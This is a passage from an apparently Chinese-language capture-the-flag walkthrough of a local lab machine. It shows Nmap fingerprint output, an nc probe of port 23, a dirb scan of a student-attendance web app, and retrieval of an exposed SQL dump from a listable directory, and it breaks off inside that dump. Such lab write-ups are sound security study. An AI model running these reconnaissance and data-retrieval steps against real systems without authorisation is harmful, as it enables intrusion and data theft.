constant">SEQ</span><span class="token punctuation">(</span><span class="token constant">SP</span><span class="token operator">=</span><span class="token number">102</span><span class="token operator">%</span><span class="token constant">GCD</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">ISR</span><span class="token operator">=</span><span class="token number">108</span><span class="token operator">%</span><span class="token constant">TI</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">CI</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">II</span><span class="token operator">=</span><span class="token constant">I</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">%</span><span class="token constant">TS</span><span class="token operator">=</span><span class="token constant">A</span><span class="token punctuation">)</span><span class="token constant">OPS</span><span class="token punctuation">(</span><span class="token constant">O1</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O2</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O3</span><span class="token operator">=</span><span class="token constant">M5B4NNT11NW7</span><span class="token operator">%</span><span class="token constant">O4</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token number">5</span><span class="token operator">=</span><span class="token constant">M5B4ST11NW7</span><span class="token operator">%</span><span class="token constant">O6</span><span class="token operator">=</span><span class="token constant">M5B4ST11</span><span class="token punctuation">)</span><span class="token constant">WIN</span><span class="token punctuation">(</span><span class="token constant">W1</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W2</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W3</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W4</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W5</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token operator">%</span><span class="token constant">W6</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">=</span><span class="token constant">FE88</span><span class="token punctuation">)</span><span class="token constant">ECN</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token constant">FAF0</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token constant">M5B4NNSNW7</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T1</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">O</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AS</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T2</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token constant">T3</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token constant">T4</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">A</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">R</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T5</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AR</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T6</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">A</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">R</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">T7</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">W</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">S</span><span class="token operator">=</span><span class="token constant">Z</span><span class="token operator">%</span><span class="token constant">A</span><span class="token operator">=</span><span class="token constant">S</span><span class="token operator">+</span><span class="token operator">%</span><span class="token constant">F</span><span class="token operator">=</span><span class="token constant">AR</span><span class="token operator">%</span><span class="token constant">O</span><span class="token operator">=</span><span class="token operator">%</span><span class="token constant">RD</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">Q</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token constant">U1</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">=</span><span class="token constant">N</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">IPL</span><span class="token operator">=</span><span class="token number">164</span><span class="token operator">%</span><span class="token constant">UN</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token constant">RIPL</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RID</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RIPCK</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RUCK</span><span class="token operator">=</span><span class="token constant">G</span><span class="token operator">%</span><span class="token constant">RUD</span><span class="token operator">=</span><span class="token constant">G</span><span class="token punctuation">)</span><span class="token constant">IE</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DFI</span><span class="token operator">=</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">N</span><span class="token operator">%</span><span class="token constant">T</span><span class="token operator">=</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">=</span><span class="token constant">S</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>Network Distance<span class="token operator">:</span> <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="69"></td><td><pre>Service Info<span class="token operator">:</span> <span class="token constant">OS</span><span class="token operator">:</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel</pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token constant">TRACEROUTE</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token number">1</span>   <span class="token number">0.53</span> ms <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token constant">OS</span> and Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span></pre></td></tr><tr><td data-num="76"></td><td><pre>Nmap done<span class="token operator">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">21.19</span> seconds</pre></td></tr></table></figure><p>可以看到存在三个端口：22 23 80</p>
<p>使用 nc 连接 23 端口发现需要输入认证码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nc <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span> <span class="token number">23</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011213558450-539935285.png" alt="" /></p>
<p>先放着，访问 80 端口：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011222246168-1851680717.png" alt="" /></p>
<p>得到一个登陆页面。</p>
<p>使用 dirb 扫描这个页面下的文件目录：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# dirb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">DIRB</span> v2<span class="token punctuation">.</span><span class="token number">22</span>    </pre></td></tr><tr><td data-num="5"></td><td><pre>By The Dark Raver</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">START_TIME</span><span class="token operator">:</span> Sat Oct  <span class="token number">9</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">29</span> <span class="token number">2021</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">URL_BASE</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">WORDLIST_FILES</span><span class="token operator">:</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>dirb<span class="token operator">/</span>wordlists<span class="token operator">/</span>common<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>                                                                           <span class="token constant">GENERATED</span> <span class="token constant">WORDS</span><span class="token operator">:</span> <span class="token number">4612</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Scanning <span class="token constant">URL</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                                                                                                                                                      <span class="token operator">==</span><span class="token operator">></span> <span class="token constant">DIRECTORY</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>assets<span class="token operator">/</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                                                                           <span class="token operator">==</span><span class="token operator">></span> <span class="token constant">DIRECTORY</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">+</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>index<span class="token punctuation">.</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token constant">CODE</span><span class="token operator">:</span><span class="token number">302</span><span class="token operator">|</span><span class="token constant">SIZE</span><span class="token operator">:</span><span class="token number">14619</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                                                                          </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Entering directory<span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>assets<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                                                                           <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> <span class="token constant">WARNING</span><span class="token operator">:</span> Directory <span class="token constant">IS</span> <span class="token constant">LISTABLE</span><span class="token punctuation">.</span> No need to scan it<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                                                                          </pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span> Entering directory<span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                                                                           <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> <span class="token constant">WARNING</span><span class="token operator">:</span> Directory <span class="token constant">IS</span> <span class="token constant">LISTABLE</span><span class="token punctuation">.</span> No need to scan it<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                                                                               </pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token constant">END_TIME</span><span class="token operator">:</span> Sat Oct  <span class="token number">9</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">33</span> <span class="token number">2021</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token constant">DOWNLOADED</span><span class="token operator">:</span> <span class="token number">4612</span> <span class="token operator">-</span> <span class="token constant">FOUND</span><span class="token operator">:</span> <span class="token number">1</span></pre></td></tr></table></figure><p>可以发现有个 database 路径，访问该路径：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span><span class="token operator">/</span>student_attendance<span class="token operator">/</span>database<span class="token operator">/</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224102460-2040444434.png" alt="" /></p>
<p>由此访问发现的 <code>student_attendance_db.sql</code>  文件，得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span> phpMyAdmin <span class="token constant">SQL</span> Dump</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span> version <span class="token number">5.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">www.phpmyadmin.net</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">--</span> Host<span class="token operator">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">--</span> Generation Time<span class="token operator">:</span> Oct <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">2020</span> at <span class="token number">04</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">PM</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">--</span> Server version<span class="token operator">:</span> <span class="token number">10.4</span><span class="token number">.11</span><span class="token operator">-</span>MariaDB</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">--</span> <span class="token constant">PHP</span> <span class="token literal-property property">Version</span><span class="token operator">:</span> <span class="token number">7.2</span><span class="token number">.28</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">SET</span> <span class="token constant">SQL_MODE</span> <span class="token operator">=</span> <span class="token string">"NO_AUTO_VALUE_ON_ZERO"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token constant">SET</span> <span class="token constant">AUTOCOMMIT</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">START</span> <span class="token constant">TRANSACTION</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">SET</span> time_zone <span class="token operator">=</span> <span class="token string">"+00:00"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment">/*!40101 SET NAMES utf8mb4 */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">--</span> Database<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_attendance_db</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">doc</span><span class="token template-punctuation string">`</span></span> date <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">doc</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="49"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="51"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token 